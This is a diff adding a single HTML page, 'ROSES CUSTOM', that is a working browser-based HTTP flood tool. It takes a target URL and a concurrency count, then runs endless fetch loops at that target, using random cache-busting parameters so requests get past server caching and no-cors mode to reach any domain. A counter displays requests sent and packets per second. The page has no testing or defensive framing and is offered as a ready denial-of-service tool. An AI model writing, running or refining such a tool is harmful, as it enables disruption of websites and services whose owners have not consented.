@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ROSES CUSTOM | Execute</title>
+    <style>
+        body { 
+            background-color: #050505;
+            background-image: url('https://i.imgur.com/your-image-here.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #00ff00; 
+            font-family: 'Courier New', monospace; 
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .panel { 
+            border: 2px solid #ff0000; 
+            background: rgba(10, 10, 10, 0.95); 
+            padding: 30px; 
+            width: 480px; 
+            box-shadow: 0 0 30px #ff0000;
+            text-align: center;
+        }
+        h1 { 
+            color: #ff0000; 
+            letter-spacing: 5px; 
+            margin-bottom: 5px;
+            text-shadow: 0 0 15px #ff0000;
+        }
+        .sub-header { color: #00ffff; font-size: 0.85em; margin-bottom: 25px; font-weight: bold; }
+        input { 
+            background: #000; 
+            border: 1px solid #ff0000; 
+            color: #00ff00; 
+            padding: 12px; 
+            width: 90%; 
+            margin: 10px 0; 
+            outline: none;
+            font-family: 'Courier New', monospace;
+        }
+        .stats { 
+            margin: 20px 0; 
+            font-size: 1.1em; 
+            display: flex; 
+            justify-content: space-around; 
+            border-top: 1px solid #444;
+            padding-top: 15px;
+        }
+        .btn-execute { 
+            background: #ff0000; 
+            color: white; 
+            border: none; 
+            padding: 15px 40px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            text-transform: uppercase;
+            transition: 0.3s;
+        }
+        .btn-execute:hover { background: #aa0000; box-shadow: 0 0 10px #ff0000; }
+        .btn-stop { 
+            background: #333; 
+            color: white; 
+            border: none; 
+            padding: 15px 40px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            text-transform: uppercase;
+            margin-left: 10px;
+        }
+        #status-display { 
+            margin-top: 20px; 
+            font-size: 0.9em; 
+            color: #ffcc00; 
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+<div class="panel">
+    <h1>ROSES CUSTOM</h1>
+    <div class="sub-header">EXECUTION AWAITING ROSES CUSTOM READY</div>
+
+    <input type="text" id="target" placeholder="TARGET URL (https://...)">
+    <br>
+    <input type="number" id="threads" placeholder="THREADS / CONCURRENCY" value="50">
+
+    <div class="stats">
+        <div>SENT: <span id="sent-count" style="color:white;">0</span></div>
+        <div>PPS: <span id="pps-count" style="color:#00ffff;">0</span></div>
+    </div>
+
+    <div>
+        <button class="btn-execute" onclick="startExecution()">EXECUTE</button>
+        <button class="btn-stop" onclick="stopExecution()">STOP</button>
+    </div>
+
+    <div id="status-display">System Idle...</div>
+</div>
+
+<script>
+    let isRunning = false;
+    let totalSent = 0;
+    let startTime = 0;
+
+    function startExecution() {
+        const target = document.getElementById('target').value;
+        if (!target.startsWith('http')) {
+            alert("Please enter a valid URL including http:// or https://");
+            return;
+        }
+
+        if (isRunning) return; // Prevent multiple clicks starting multiple loops
+
+        isRunning = true;
+        totalSent = 0;
+        startTime = Date.now();
+        document.getElementById('status-display').innerText = "ROSES CUSTOM: EXECUTION IN PROGRESS";
+
+        const threadCount = parseInt(document.getElementById('threads').value) || 50;
+
+        // Launch the requested number of worker loops
+        for (let i = 0; i < threadCount; i++) {
+            infiniteWorker(target);
+        }
+        
+        // Start the UI Refresh timer
+        requestAnimationFrame(updateUI);
+    }
+
+    async function infiniteWorker(url) {
+        while (isRunning) {
+            try {
+                // Generates a unique query parameter to bypass server caching
+                let cacheBuster = (url.includes('?') ? '&' : '?') + 'rc_burst=' + Math.random();
+                
+                // Fetch in 'no-cors' mode allows sending requests to any IP/Domain
+                await fetch(url + cacheBuster, { 
+                    mode: 'no-cors', 
+                    cache: 'no-cache',
+                    referrerPolicy: 'no-referrer' 
+                });
+                totalSent++;
+            } catch (e) {
+                // Count errors as packets sent because the request still left the browser
+                totalSent++;
+            }
+        }
+    }
+
+    function updateUI() {
+        if (!isRunning && totalSent === 0) return;
+        
+        document.getElementById('sent-count').innerText = totalSent.toLocaleString();
+        
+        let elapsed = (Date.now() - startTime) / 1000;
+        if (elapsed > 0) {
+            let pps = Math.floor(totalSent / elapsed);
+            document.getElementById('pps-count').innerText = pps.toLocaleString();
+        }
+
+        if (isRunning) {
+            requestAnimationFrame(updateUI);
+        }
+    }
+
+    function stopExecution() {
+        isRunning = false;
+        document.getElementById('status-display').innerText = "ROSES CUSTOM: EXECUTION STOPPED";
+    }
+</script>
+
+</body>
+</html>
